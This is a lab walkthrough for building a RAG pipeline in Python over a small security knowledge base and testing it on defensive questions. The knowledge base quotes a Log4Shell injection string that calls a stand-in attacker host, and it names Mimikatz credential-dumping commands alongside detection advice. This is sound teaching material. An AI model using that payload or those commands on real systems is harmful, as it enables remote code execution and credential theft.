# Lab — Exercise 3: The Full RAG Pipeline

> Follow each step in order. Write the code into your script file as you go. By the final step you will have a complete, runnable Python script.

---

## Step 1: Create your script file

Create a new file called `03_rag_pipeline.py` in this folder.

> Requires: `pip install sentence-transformers`
> Requires at least one API key: `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, or `GOOGLE_API_KEY`.

---

## Step 2: Add the imports and set up both models

This exercise combines the embedding model (for retrieval) with the LLM client (for generation). The `sys.path` fix gives Python access to `llm_client.py` one level up.

```python
import re
import numpy as np
from sklearn.metrics.pairwise import cosine_similarity
from sentence_transformers import SentenceTransformer
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from llm_client import get_client

embed_model = SentenceTransformer("all-MiniLM-L6-v2")

provider, llm_client = get_client()
if llm_client is None:
    print("No API key found. Set ANTHROPIC_API_KEY, OPENAI_API_KEY, or GOOGLE_API_KEY.")
    print("(Task 1 — building the augmented prompt — still works without an API key.)")

print(f"Embedding model: all-MiniLM-L6-v2")
if llm_client:
    print(f"LLM provider: {provider}")
```

---

## Step 3: Add the knowledge base and index-building helpers

The `build_index` and `retrieve` functions are the same retrieval logic from Exercise 2, reproduced here so this file runs standalone. `QUESTIONS` are the three security questions you will answer using the RAG pipeline.

Add this to your file:

```python
KNOWLEDGE_BASE = {
    "mimikatz": """
Mimikatz extracts plaintext passwords and NTLM hashes from Windows LSASS memory.
Common techniques: sekurlsa::logonpasswords, lsadump::dcsync, kerberos::golden for Golden Ticket attacks.
Detection: monitor LSASS memory access by non-system processes using Sysmon Event ID 10.
Unexpected access to lsass.exe from procdump, taskmgr, or unsigned binaries triggers high alerts.
Mitigations: Credential Guard, disable WDigest, Protected Users group, LSA Protection.
""",
    "log4shell": """
CVE-2021-44228 Log4Shell is a critical RCE in Apache Log4j2 versions 2.0-beta9 through 2.14.1.
Attack vector: inject ${jndi:ldap://attacker.com/x} into any logged field.
No authentication required; CVSS score 10.0.
Remediation: upgrade to Log4j 2.17.1. Detection: outbound LDAP, jndi patterns in web logs.
""",
    "ransomware": """
Ransomware incident response phases:
Phase 1 (0-30 min): confirm indicators, find Patient Zero, do NOT reboot.
Phase 2: isolate via VLAN, disable accounts, block C2.
Phase 3: remove persistence, reset credentials, patch initial access vector.
Phase 4: restore from clean backups, monitor for re-infection.
""",
    "lateral_movement": """
Lateral movement detection: SMB anomalies (Event 4624 type 3), unusual RDP, PsExec/WMI execution.
Pass-the-Hash reuses NTLM hashes. Baseline admin behaviour to detect anomalies.
Alert when admin tools appear on non-admin workstations.
""",
    "phishing": """
Identify phishing by checking SPF/DKIM/DMARC, sender domain age, and URL redirect chains.
Hash attachments and check VirusTotal. Sandbox unknown executables.
Spear-phishing uses OSINT; BEC uses lookalike domains and urgency.
""",
    "network_segmentation": """
Segment: DMZ for internet-facing services, separate VLAN for OT/ICS, isolated network for DCs.
Zero-trust: verify every request, assume breach. Microsegmentation limits east-west traffic.
Document all segment boundaries and authorised communication paths.
""",
}

QUESTIONS = [
    "What Sysmon event ID should I monitor for credential dumping attacks?",
    "What are the first steps when ransomware is detected in my environment?",
    "How can I prevent lateral movement between network segments?",
]

def build_index(kb):
    all_chunks = []
    for doc_id, text in kb.items():
        words = text.split()
        step = 50
        for i in range(0, len(words), step):
            chunk = " ".join(words[i:i + 60])
            if len(chunk.split()) >= 10:
                all_chunks.append((doc_id, chunk))
    texts = [c[1] for c in all_chunks]
    idx = embed_model.encode(texts)
    return all_chunks, idx

def retrieve(query, all_chunks, index, top_k=3):
    q = embed_model.encode([query])
    sims = cosine_similarity(q, index)[0]
    top = np.argsort(sims)[::-1][:top_k]
    return [(float(sims[i]), all_chunks[i][0], all_chunks[i][1]) for i in top]

all_chunks, index = build_index(KNOWLEDGE_BASE)
print(f"Index built: {len(all_chunks)} chunks from {len(KNOWLEDGE_BASE)} documents\n")
```

Run your file. You should see:
```
Embedding model: all-MiniLM-L6-v2
LLM provider: claude
Index built: 18 chunks from 6 documents
```

---

## Step 4: Build the augmented system prompt

`build_rag_prompt` retrieves the top-k chunks and formats them as a `CONTEXT` block inside the system prompt. The instruction "use ONLY the information in the context below" is what prevents hallucination.

Add this to your file:

```python
def build_rag_prompt(query, top_k=3):
    results = retrieve(query, all_chunks, index, top_k=top_k)
    context = "\n\n".join(
        [f"[Source: {doc_id}]\n{chunk}" for score, doc_id, chunk in results]
    )
    return (
        "You are a security analyst assistant.\n"
        "Answer the user's question using ONLY the information in the context below.\n"
        "If the answer is not in the context, say 'I don't have that information in my knowledge base.'\n"
        "Always cite which [Source: ...] you used.\n\n"
        f"CONTEXT:\n{context}"
    )

print("=== Augmented prompt for question 1 ===")
print(build_rag_prompt(QUESTIONS[0]))
```

Run your file. The output should show the full system prompt including the retrieved Mimikatz and Sysmon Event ID 10 context.

---

## Step 5: Full RAG call — compare pure LLM vs RAG

Sending the same question with and without the retrieved context shows the key RAG benefit: the RAG response should specifically mention "Sysmon Event ID 10" because that fact is in the knowledge base. The pure LLM answer may be more general.

Add this to your file:

```python
if llm_client:
    print("\n=== Pure LLM (no context) ===")
    pure_resp = llm_client.chat(
        system="You are a security analyst assistant.",
        messages=[{"role": "user", "content": QUESTIONS[0]}],
        max_tokens=200,
    )
    print(pure_resp)

    print("\n=== RAG answer (with retrieved context) ===")
    rag_system = build_rag_prompt(QUESTIONS[0])
    rag_resp = llm_client.chat(
        system=rag_system,
        messages=[{"role": "user", "content": QUESTIONS[0]}],
        max_tokens=200,
    )
    print(rag_resp)
else:
    print("(Skipping Task 2 — no API key found)")
```

Run your file. The RAG answer should reference "Sysmon Event ID 10" explicitly.

---

## Step 6: Three-question Q&A session

Running all three questions through the full pipeline shows the range of the knowledge base. For each question the retrieved sources tell you which documents the answer is grounded in.

Add this to your file:

```python
if llm_client:
    print("\n=== 3-Question Q&A Session ===\n")
    for question in QUESTIONS:
        results = retrieve(question, all_chunks, index, top_k=3)
        sources = ", ".join(f"{doc_id} ({score:.2f})" for score, doc_id, _ in results)
        rag_system = build_rag_prompt(question, top_k=3)
        answer = llm_client.chat(
            system=rag_system,
            messages=[{"role": "user", "content": question}],
            max_tokens=250,
        )
        print(f"Q: {question}")
        print(f"Retrieved: {sources}")
        print(f"A: {answer}\n")
else:
    print("(Skipping Task 3 — no API key found)")
```

Run your file. You should see something like:
```
Q: What Sysmon event ID should I monitor for credential dumping attacks?
Retrieved: mimikatz (0.89), lateral_movement (0.65), mimikatz (0.61)
A: According to the Mimikatz documentation [Source: mimikatz], you should monitor Sysmon Event ID 10...
```

---

## Step 7: Out-of-scope question (Bonus Task 4)

When the knowledge base does not contain relevant information, the RAG system should refuse to answer rather than hallucinate. This tests that the "use ONLY the context" instruction is working.

Add this to your file:

```python
if llm_client:
    OUT_OF_SCOPE = "What is the best antivirus software to buy in 2024?"
    print("\n=== Out-of-scope question ===")
    results = retrieve(OUT_OF_SCOPE, all_chunks, index, top_k=3)
    print(f"Query: {OUT_OF_SCOPE}")
    print("Retrieved chunks (low relevance expected):")
    for score, doc_id, chunk in results:
        print(f"  {score:.4f} | {doc_id} | {chunk[:60]}...")
    rag_system = build_rag_prompt(OUT_OF_SCOPE, top_k=3)
    answer = llm_client.chat(
        system=rag_system,
        messages=[{"role": "user", "content": OUT_OF_SCOPE}],
        max_tokens=150,
    )
    print(f"\nRAG answer: {answer}")

print("\n--- Exercise 3 complete. RAG workshop finished! ---")
print("--- Open solution_rag_pipeline.py to compare your implementation. ---")
```

Run your file. The RAG answer should say it does not have that information, rather than recommending specific products.

---

## Your completed script

At this point your file contains all the working code. Compare it against the matching solution file (`solution_rag_pipeline.py`) if anything looks different.
